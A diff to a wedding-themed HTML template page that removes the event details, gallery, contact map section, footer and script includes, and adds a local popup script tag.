-					<div class="wedding-details margin-bottom">
-						
-						<div class="w-detail right">
-							<i class="icon icon-ciurclke"></i>
-							<h4 class="title">CEREMONY</h4>
-							<p>Look at the most passionate ceremony ever. We wish happiness to the wedding couple.</p>
-						</div><!-- w-detail -->
-						
-						<div class="w-detail left">
-							<i class="icon icon-wine-glass"></i>
-							<h4 class="title">TOAST & DINNER</h4>
-							<p>Look at the most passionate ceremony ever. We wish happiness to the wedding couple.</p>
-						</div><!-- w-detail -->
-						
-						<div class="w-detail right">
-							<i class="icon icon-cake"></i>
-							<h4 class="title">WEDDING CAKE</h4>
-							<p>Look at the most passionate ceremony ever. We wish happiness to the wedding couple.</p>
-						</div><!-- w-detail -->
-						
-						<div class="w-detail left">
-							<i class="icon icon-camera"></i>
-							<h4 class="title">PHOTOGRAPHY</h4>
-							<p>Look at the most passionate ceremony ever. We wish happiness to the wedding couple.</p>
-						</div><!-- w-detail -->
-						
-					</div><!-- wedding-details -->
-					
-				</div><!-- col-sm-10 -->
-			</div><!-- row -->
-		</div><!-- container -->
-	</section><!-- section -->
-	
-	<section class="section ceremony-area center-text">
-		<div class="container">
-			<div class="row">
-				<div class="col-sm-12">
-					
-					<div class="heading">
-						<h2 class="title">Wedding & Ceremonies</h2>
-						<span class="heading-bottom"><i class="color-white icon icon-star"></i></span>
-					</div>
-
-					<div class="ceremony margin-bottom">
-						<p class="desc">We assist our clients in creating memorable, magical 
-						celebrations that exceed expectations. Our personal approach ensures the weddings we 
-						plan are meaningful and truly reflect our clients as individuals, as couples, and states 
-						something about their shared values and sense of style.</p>
-						
-						<a class="border-btn" href="#">LEARN MORE</a>
-					</div>
-					
-				</div><!-- col-sm-10 -->
-			</div><!-- row -->
-		</div><!-- container -->
-	</section><!-- section -->
-	
-	
-	
-	<section class="section galery-area center-text">
-		<div class="container">
-			<div class="row">
-				
-				<div class="col-sm-12">
-					
-					<div class="heading">
-						<h2 class="title">Our Gallery</h2>
-						<span class="heading-bottom"><i class="icon icon-star"></i></span>
-					</div>
-					
-					<div class="image-gallery">
-						<div class="row">
-					
-							<div class="col-md-4 col-sm-6">
-								<a href="images/gallery-1-600x400.jpg" data-fluidbox><img class="margin-bottom" src="images/gallery-1-600x400.jpg" alt="Gallery Image"></a>
-							</div><!-- col-sm-4 -->
-							
-							<div class="col-md-4 col-sm-6">
-								<a href="images/gallery-2-600x400.jpg" data-fluidbox><img class="margin-bottom" src="images/gallery-2-600x400.jpg" alt="Gallery Image"></a>
-							</div><!-- col-sm-4 -->
-							
-							<div class="col-md-4 col-sm-6">
-								<a href="images/gallery-3-600x400.jpg" data-fluidbox><img class="margin-bottom" src="images/gallery-3-600x400.jpg" alt="Gallery Image"></a>
-							</div><!-- col-sm-4 -->
-							
-							<div class="col-md-4 col-sm-6">
-								<a href="images/gallery-4-600x400.jpg" data-fluidbox><img class="margin-bottom" src="images/gallery-4-600x400.jpg" alt="Gallery Image"></a>
-							</div><!-- col-sm-4 -->
-							
-							<div class="col-md-4 col-sm-6">
-								<a href="images/gallery-5-600x400.jpg" data-fluidbox><img class="margin-bottom" src="images/gallery-5-600x400.jpg" alt="Gallery Image"></a>
-							</div><!-- col-sm-4 -->
-							
-							<div class="col-md-4 col-sm-6">
-								<a href="images/gallery-1-600x400.jpg" data-fluidbox><img class="margin-bottom" src="images/gallery-1-600x400.jpg" alt="Gallery Image"></a>
-							</div><!-- col-sm-4 -->
-							
-						</div><!-- row -->
-						
-						<a class="btn-2 margin-bottom gallery-btn" href="#">VIEW ALL GALLERY</a>
-						
-					</div><!-- image-gallery -->
-					
-				</div><!-- col-sm-10 -->
-			</div><!-- row -->
-		</div><!-- container -->
-	</section><!-- section -->
-	
-	<section class="contact-area">
-		<div class="contact-wrapper section float-left">
-			<div class="container">
-				<div class="row">
-					<div class="col-sm-2"></div>
-					
-					<div class="col-sm-10">
-						<div class="heading">
-							<h3 class="title">Contact Us</h3>
-							<i class="icon icon-star"></i>
-						</div>
-						
-						<div class="margin-bottom">
-							<p>On the 01 September 2020</p>
-							<p>Join us as we celebrate life and love.</p>
-							<h4><a href="tel:784-412-0646" class="phone">784-412-0646</a></h4>
-							<p>14 Baria street 133/2, New York City, US</p>
-							
-						</div><!-- margin-bottom -->
-					</div><!-- col-sm-10 -->
-					
-				</div><!-- row -->
-			</div><!-- container -->
-		</div><!-- float-left -->
-		
-		<div class="map-area">
-			<div id="map" style="height:100%;"></div>
-		</div><!-- map-area -->
-		<script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB-oEyU88bRR6xcbV1gI_Cahc8ugKC_JPE&callback=initMap"></script>
-	
-	</section><!-- section -->
-	
-	
-	<footer>
-		<div class="container center-text">
-			
-			<div class="logo-wrapper">
-				<a class="logo" href="#"><img src="images/logo-black.png" alt="Logo Image"></a>
-				<i class="icon icon-star"></i>
 			</div>
-			
-			<div class="newsletter">
-				<h4 class="title">RECEIVE NEWS IN YOUR EMAIL</h4>
-				<p>Join our mailing list to receive news and announcements</p>
-				<div class="email-area">
-					<form>
-						<input class="email-input" type="text" placeholder="Your Email">
-						<button class="submit-btn" type="submit"><i class="icon icon-email-plane"></i></button>
-					</form>
-				</div><!-- email-area -->
-			</div><!-- newsletter -->
-			
-			
-			<ul class="social-icons">
-				<li><a href="#"><i class="icon icon-heart"></i></a></li>
-				<li><a href="#"><i class="icon icon-twitter"></i></a></li>
-				<li><a href="#"><i class="icon icon-instagram"></i></a></li>
-				<li><a href="#"><i class="icon icon-pinterest"></i></a></li>
-				<li><a href="#"><i class="icon icon-tripadvisor"></i></a></li>
-			</ul>
+		</div>
 
-			<ul class="footer-links">
-				<li><a href="#">HOME</a></li>
-				<li><a href="#">OUR STORIES</a></li>
-				<li><a href="#">THE WEDDING</a></li>
-				<li><a href="#">GALLERY</a></li>
-				<li><a href="#">CONTACT</a></li>
-			</ul>
-			
-			<p class="copyright"><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved |  <i class="icon-heart" aria-hidden="true"></i> by <a href="" target="_blank">Happy Family</a>
-<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></p>
-			
-		</div><!-- container -->
-	</footer>
-	
-	
-	<!-- SCIPTS -->
-	
-	<script src="common-js/jquery-3.1.1.min.js"></script>
-	
-	<script src="common-js/tether.min.js"></script>
-	
-	<script src="common-js/bootstrap.js"></script>
-	
-	<script src="common-js/jquery.countdown.min.js"></script>
-	
-	<script src="common-js/jquery.fluidbox.min.js"></script>
-	
-	
-	<script src="common-js/scripts.js"></script>
-	
+</div>
+
+    <script src="js/tp_popup.js"></script>
 </body>
+
 </html>
